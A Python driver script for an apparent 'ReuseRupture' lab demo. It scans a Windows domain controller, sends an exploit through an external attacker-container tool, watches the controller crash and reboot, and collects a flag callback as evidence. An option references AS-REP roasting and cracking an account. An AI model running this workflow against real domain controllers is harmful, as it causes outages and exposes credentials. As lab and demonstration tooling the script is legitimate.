#!/usr/bin/env python3
"""demo.py."""

from __future__ import annotations

import argparse
import json
import os
import secrets
import subprocess
import time
from pathlib import Path

from scripts.rrlib import (
    ROOT,
    attacker_cmd,
    banner,
    container_path,
    demo_auth_target,
    info,
    load_config,
    ok,
    port_is_open,
    redacted_config_json,
    render_inventory,
    run,
    step,
    utc_stamp,
    wait_for_tcp,
)


def run_logged(name: str, evidence_dir: Path, command: list[str]) -> int:
    """Run a command, stream its output, and save it to <name>.log."""
    process = subprocess.run(command, cwd=str(ROOT), text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    print(process.stdout, end="" if process.stdout.endswith("\n") else "\n")
    (evidence_dir / f"{name}.log").write_text(process.stdout, encoding="utf-8")
    return process.returncode


def dc_powershell(script: str) -> subprocess.CompletedProcess:
    """Run a PowerShell snippet on the domain controller via Ansible."""
    return run(
        [
            "ansible", "-i", str(ROOT / "inventory/hosts.yml"), "domain_controller",
            "-m", "ansible.windows.win_powershell",
            "-a", json.dumps({"script": script}),
        ],
        check=False,
        capture=True,
    )


def dc_powershell_logged(script: str, evidence_dir: Path, log_name: str) -> int:
    result = dc_powershell(script)
    (evidence_dir / log_name).write_text(result.stdout + result.stderr, encoding="utf-8")
    return result.returncode


def dc_powershell_lines(script: str) -> list[str]:
    """Run PowerShell on the DC and return only the script's output lines.

    Forces the minimal stdout callback so we can parse the JSON result and strip
    Ansible's wrapper noise, regardless of the host's ansible.cfg callback.
    """
    env = {**os.environ, "ANSIBLE_STDOUT_CALLBACK": "minimal"}
    result = subprocess.run(
        [
            "ansible", "-i", str(ROOT / "inventory/hosts.yml"), "domain_controller",
            "-m", "ansible.windows.win_powershell",
            "-a", json.dumps({"script": script}),
        ],
        cwd=str(ROOT),
        text=True,
        capture_output=True,
        env=env,
    )
    marker = result.stdout.find("=> ")
    if marker == -1:
        return []
    try:
        payload = json.loads(result.stdout[marker + 3:])
    except json.JSONDecodeError:
        return []
    return [str(line) for line in payload.get("output", [])]


def prepare_evidence_dir(config: dict, run_id: str) -> Path:
    evidence_dir = ROOT / config["demo"]["evidence_root"] / utc_stamp()
    evidence_dir.mkdir(parents=True, exist_ok=True)
    (evidence_dir / "run-id.txt").write_text(run_id + "\n", encoding="utf-8")
    (evidence_dir / "config.redacted.json").write_text(redacted_config_json(), encoding="utf-8")
    info(f"Evidence directory: {evidence_dir}")
    info(f"Run ID: {run_id}")
    return evidence_dir


def start_flag_listener(config: dict, run_id: str, evidence_dir: Path) -> subprocess.Popen | None:
    """Start the flag listener in the attacker container; return None if it dies immediately."""
    step("Starting flag listener in attacker container")
    listener_log = evidence_dir / "listener.log"
    subprocess.run(attacker_cmd("pkill", "-f", "flag-listener.py"), check=False, capture_output=True)
    listener = subprocess.Popen(
        attacker_cmd(
            "python3", "/opt/reuserupture/flag/flag-listener.py",
            "--host", "0.0.0.0",
            "--port", str(config["flag"]["listener_port"]),
            "--expected-run-id", run_id,
            "--evidence-dir", container_path(evidence_dir),
            "--timeout", str(config["demo"]["reboot_timeout_seconds"]),
        ),
        cwd=str(ROOT),
        text=True,
        stdout=listener_log.open("w", encoding="utf-8"),
        stderr=subprocess.STDOUT,
    )
    time.sleep(3)
    if listener.poll() is not None:
        info(f"Listener log:\n{listener_log.read_text(encoding='utf-8', errors='replace')}")
        return None
    ok("Flag listener is running")
    return listener


def watch_for_reboot(config: dict, evidence_dir: Path) -> bool:
    """Watch WinRM go down then come back. Return True only if both are observed."""
    step("Watching for reboot down/up sequence")
    ip = config["windows"]["ip"]
    port = int(config["windows"]["winrm_port"])
    availability_log = evidence_dir / "availability.log"
    deadline = time.monotonic() + int(config["demo"]["reboot_timeout_seconds"])
    saw_down = False

    while time.monotonic() < deadline:
        is_up = port_is_open(ip, port)
        timestamp = utc_stamp("%Y-%m-%dT%H:%M:%SZ")
        with availability_log.open("a", encoding="utf-8") as fh:
            fh.write(f"{timestamp} {'up' if is_up else 'down'}\n")

        if not is_up and not saw_down:
            ok("Domain controller became unavailable")
            saw_down = True
            (evidence_dir / "target-unavailable.txt").write_text(timestamp + "\n", encoding="utf-8")
        elif is_up and saw_down:
            ok("Domain controller returned")
            (evidence_dir / "target-returned.txt").write_text(timestamp + "\n", encoding="utf-8")
            time.sleep(30)
            show_dc_callback_log(evidence_dir)
            return True

        time.sleep(5)

    return False


def show_dc_callback_log(evidence_dir: Path) -> None:
    lines = dc_powershell_lines(
        "Get-Content C:\\ReuseRuptureDemo\\flag-callback.log -ErrorAction SilentlyContinue "
        "| Select-Object -Last 30"
    )
    (evidence_dir / "dc-flag-callback.log").write_text("\n".join(lines) + "\n", encoding="utf-8")
    if lines:
        info("DC confirms: " + lines[-1].strip())


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--yes", action="store_true")
    parser.add_argument("--skip-scan", action="store_true")
    parser.add_argument("--full", action="store_true", help="Run the full demo: AS-REP roast and crack legacy-user, then the standard scan/exploit/reboot flow.")
    args = parser.parse_args()

    if args.full:
        return run([str(ROOT / "scripts/run-full-demo.py")], check=False).returncode

    banner("ReuseRupture Demo", "Scan, exploit, observe reboot, and wait for the armed flag callback.")
    config = load_config()
    render_inventory()

    run_id = secrets.token_hex(4)
    evidence_dir = prepare_evidence_dir(config, run_id)

    step("Checking lab reachability")
    attacker_check = run(attacker_cmd("reuserupture", "--help"), check=False, capture=True)
    if attacker_check.returncode != 0:
        info((attacker_check.stdout + attacker_check.stderr).strip())
        return 1
    if not wait_for_tcp(config["windows"]["ip"], int(config["windows"]["winrm_port"]), 180):
        return 1

    step("Verifying lab readiness")
    verify_rc = run_logged("verify", evidence_dir, [str(ROOT / "scripts/verify-lab.py")])
    if verify_rc != 0:
        return verify_rc

    step("Arming Windows startup flag callback")
    dc_powershell_logged(
        rf"Set-Content -Path C:\ReuseRuptureDemo\armed-run-id.txt -Value '{run_id}' -Encoding ASCII",
        evidence_dir,
        "arm.log",
    )
    step("Recording current domain controller boot time")
    dc_powershell_logged(
        r"(Get-CimInstance Win32_OperatingSystem).LastBootUpTime.ToUniversalTime().ToString('o')",
        evidence_dir,
        "boot-before.log",
    )

    listener = start_flag_listener(config, run_id, evidence_dir)
    if listener is None:
        return 1

    auth_target = demo_auth_target(config)

    if not args.skip_scan:
        step("Running vulnerability scanner")
        scan_rc = run_logged("scanner", evidence_dir, attacker_cmd("reuserupture", "scan", auth_target))
        if scan_rc != 1:
            (evidence_dir / "final-summary.txt").write_text("Scanner did not report vulnerable behavior.\n", encoding="utf-8")
            listener.terminate()
            return 1

    if not args.yes:
        answer = input("Send exploit now? [y/N] ")
        if answer.lower() not in {"y", "yes"}:
            listener.terminate()
            return 130

    step("Sending exploit")
    exploit_rc = run_logged("exploit", evidence_dir, attacker_cmd("reuserupture", "exploit", auth_target))
    if exploit_rc != 0:
        listener.terminate()
        return 1

    if not watch_for_reboot(config, evidence_dir):
        listener.terminate()
        return 1

    step("Waiting for matching flag callback")
    listener_rc = listener.wait()
    if listener_rc != 0:
        return listener_rc

    callback = json.loads((evidence_dir / "flag-callback.json").read_text(encoding="utf-8"))
    summary = (
        "SUCCESS\n"
        "Scanner reported vulnerable behavior: yes\n"
        "Exploit sent and SAMR pipe break observed: yes\n"
        "Target became unavailable: yes\n"
        "Target returned: yes\n"
        f"Correct run ID received: {run_id}\n"
        f"Flag: {callback['flag']}\n"
    )
    (evidence_dir / "final-summary.txt").write_text(summary, encoding="utf-8")
    reveal_flag(callback["flag"], run_id, evidence_dir)
    return 0


def reveal_flag(flag: str, run_id: str, evidence_dir: Path) -> None:
    line = "=" * 72
    print(f"\n{line}")
    print("  >>> FLAG CAPTURED <<<")
    print(line)
    print(f"\n  {flag}\n")
    print(f"  run id    : {run_id}")
    print(f"  evidence  : {evidence_dir}")
    print(f"{line}\n")


if __name__ == "__main__":
    raise SystemExit(main())
